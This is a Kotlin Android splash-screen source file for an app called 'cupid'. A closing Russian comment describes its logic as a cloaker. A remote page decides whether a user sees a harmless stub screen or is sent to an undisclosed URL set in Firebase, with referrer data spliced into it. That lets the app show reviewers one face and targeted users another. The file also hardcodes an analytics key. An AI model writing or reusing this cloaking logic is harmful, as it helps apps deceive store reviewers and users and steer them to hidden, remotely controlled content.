package com.your.cupid.ui

import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.preference.PreferenceManager
import android.util.Log
import android.view.View
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.ProgressBar
import com.your.cupid.*
import com.your.cupid._core.BaseActivity
import com.your.cupid.activities.MainEkranActivity
import com.google.firebase.analytics.FirebaseAnalytics
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.onesignal.OneSignal
import com.yandex.metrica.YandexMetrica
import com.yandex.metrica.YandexMetricaConfig
import kotlinx.android.synthetic.main.activity_web_view.*
import org.joda.time.DateTime
import org.joda.time.Days



class SplashActivity : BaseActivity() {

    private lateinit var webView: WebView
    private lateinit var progressBar: ProgressBar

    private lateinit var dataSnapshot: DataSnapshot

    private lateinit var database: DatabaseReference
    val REFERRER_DATA = "REFERRER_DATA"
    val badgeCount = 1

    lateinit var prefs: SharedPreferences

    lateinit var firebaseAnalytic: FirebaseAnalytics

    override fun getContentView(): Int = R.layout.activity_web_view



    override fun initUI() {
        webView = web_view
        progressBar = progress_bar

        firebaseAnalytic = FirebaseAnalytics.getInstance(this)

        prefs = getSharedPreferences("com.your.cupid", Context.MODE_PRIVATE)
        prefs.edit().putString("sessionTime", DateTime.now().toString()).apply()

        checkReturn()

        OneSignal.startInit(this)
                .inFocusDisplaying(OneSignal.OSInFocusDisplayOption.Notification)
                .unsubscribeWhenNotificationsAreDisabled(true)
                .init()

    }

    fun checkReturn() {
        if (prefs.getString("dateInstall", "") != "") {
            if (Days.daysBetween(DateTime(prefs.getString("dateInstall", "")), DateTime.now()).days == 1) {
                if (!prefs.getBoolean("rrToday", false)) {
                    prefs.edit().putString("rr", "RR").apply()
                    val rrOneBundle = Bundle()
                    rrOneBundle.putString("RR", "RR")

                    firebaseAnalytic.logEvent("RR", rrOneBundle)
                    prefs.edit().putBoolean("rrToday", true).apply()
                }
            }
        }
    }

    fun getPreferer(context: Context): String? {
        val sp = PreferenceManager.getDefaultSharedPreferences(context)
        if (!sp.contains(REFERRER_DATA)) {
            return "Didn't got any referrer follow instructions"
        }
        return sp.getString(REFERRER_DATA, null)
    }



    override fun setUI() {
        logEvent("splash-screen")
        webView.webViewClient = object : WebViewClient() {
            @SuppressLint("deprecated")
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                if (url.contains("/money")) {
                    // task url for web view or browser
//                    val taskUrl = dataSnapshot.child(TASK_URL).value as String
                    val value = dataSnapshot.child(SHOW_IN).value as String
                    var taskUrl = dataSnapshot.child(TASK_URL).value as String

                    if (prefs.getBoolean("firstrun", true)) {
                        prefs.edit().putString("dateInstall", DateTime.now().toString()).apply()
                        prefs.edit().putBoolean("firstrun", false).apply()
                    }

                    taskUrl = prefs.getString("endurl", taskUrl).toString()

                    if (taskUrl.contains("{t3}")){
                        if (getPreferer(this@SplashActivity) != "Didn't got any referrer follow instructions") {
                            taskUrl = taskUrl.replace("{t3}", getPreferer(this@SplashActivity).toString())
                        }
                    }

                    if (value == WEB_VIEW) {
                            startActivity(
                                    Intent(this@SplashActivity, WebViewActivity::class.java)
                                .putExtra(EXTRA_TASK_URL, taskUrl)
                            )
                        finish()
                    } else if (value == BROWSER) {
                        // launch browser with task url
                        val browserIntent = Intent(
                                Intent.ACTION_VIEW,
                                Uri.parse("")
                        )

                        logEvent("task-url-browser")
                        startActivity(browserIntent)
                        finish()
                    }
                } else if (url.contains("/main")) {
                    startActivity(Intent(this@SplashActivity, MainEkranActivity::class.java))
                    finish()
                }
                progressBar.visibility = View.GONE
                return false
            }
        }

        progressBar.visibility = View.VISIBLE

        val config = YandexMetricaConfig.newConfigBuilder("bad42a86-beba-425c-ab59-17ccf98f7197").build()
        YandexMetrica.activate(this, config)
        YandexMetrica.enableActivityAutoTracking(this.application)

//        val success = ShortcutBadger.applyCount(this, badgeCount)
//        if (!success) {
//            startService(
//                    Intent(this, BadgeCreateIntentService::class.java).putExtra("badgeCount", badgeCount)
//            )
//        }
//
//        try {
//            Badges.setBadge(this, badgeCount)
//        } catch (badgesNotSupportedException: BadgesNotSupportedException) {
//            Log.d("SplashActivityBadge", badgesNotSupportedException.message)
//        }

        database = FirebaseDatabase.getInstance().reference

        getValuesFromDatabase({
            dataSnapshot = it


            // load needed url to determine if user is suitable
            webView.loadUrl(it.child(SPLASH_URL).value as String)
        }, {
            Log.d("SplashErrActivity", "didn't work fetchremote")
            progressBar.visibility = View.GONE
        })
    }
}

/*
в initview инициализируется веб вью и прогресс бар в getcontentView берется нужная вьюшка для отображения
дальше мы получаем базу данных из baseactivity и грузим с фаербейса ссылку для слеш активити, дальше вызывается
shouldOverrideUrlLoading и там, в зависимости от того что вернула клоака money или main мы открываем либо веб вью с сайтом (получая ссылку все
с того же фаербейс в переменную taskUrl и передаем ее интентом в веб вью) либо в заглушку
 */